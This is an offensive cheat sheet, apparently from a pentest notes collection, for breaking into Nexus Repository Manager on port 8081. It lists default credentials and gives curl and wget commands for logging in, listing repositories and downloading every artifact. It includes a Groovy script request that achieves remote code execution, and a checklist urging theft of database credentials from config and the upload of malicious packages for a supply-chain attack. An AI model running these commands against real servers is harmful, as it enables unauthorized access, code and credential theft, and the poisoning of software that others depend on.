# NEXUS REPOSITORY ENUMERATION (Port 8081)

## SERVICE OVERVIEW
```
Nexus Repository Manager - artifact repository
- Default port: 8081
- Stores: Maven, npm, Docker, NuGet packages
- Default credentials: admin:admin123
- Contains proprietary code, artifacts
```

## DETECTION
```bash
nmap -sV -p8081 <IP>
curl http://<IP>:8081
curl http://<IP>:8081/nexus  # Nexus 2.x
curl http://<IP>:8081/       # Nexus 3.x
```

## DEFAULT CREDENTIALS
```bash
# Nexus default credentials
admin:admin123
nexus:nexus
deployment:deployment123

# Test login
curl -u admin:admin123 http://<IP>:8081/service/rest/v1/status
```

## EXPLOITATION
```bash
# After login:
# 1. Download all artifacts (source code!)
# 2. Upload malicious packages
# 3. Extract credentials from config
# 4. Access to proprietary code

# List repositories
curl -u admin:admin123 http://<IP>:8081/service/rest/v1/repositories

# Download artifacts
wget --user=admin --password=admin123 -r http://<IP>:8081/repository/<repo_name>/

# Groovy script RCE (if admin)
curl -u admin:admin123 -X POST http://<IP>:8081/service/rest/v1/script \
  -H "Content-Type: application/json" \
  -d '{"name":"test","type":"groovy","content":"def proc=\"whoami\".execute();def os=new StringWriter();proc.waitForProcessOutput(os, System.err);return os.toString();"}'
```

## VULNERABILITIES
```bash
# CVE-2020-10204: RCE via EL injection
# CVE-2019-7238: RCE via Java deserialization

searchsploit nexus
nmap -p8081 --script vuln <IP>
```

## QUICK WINS
```
☐ Test admin:admin123
☐ Download all artifacts/code
☐ Look for internal packages
☐ Extract database credentials from config
☐ Upload malicious packages (supply chain attack!)
☐ Groovy script RCE (if admin access)
```
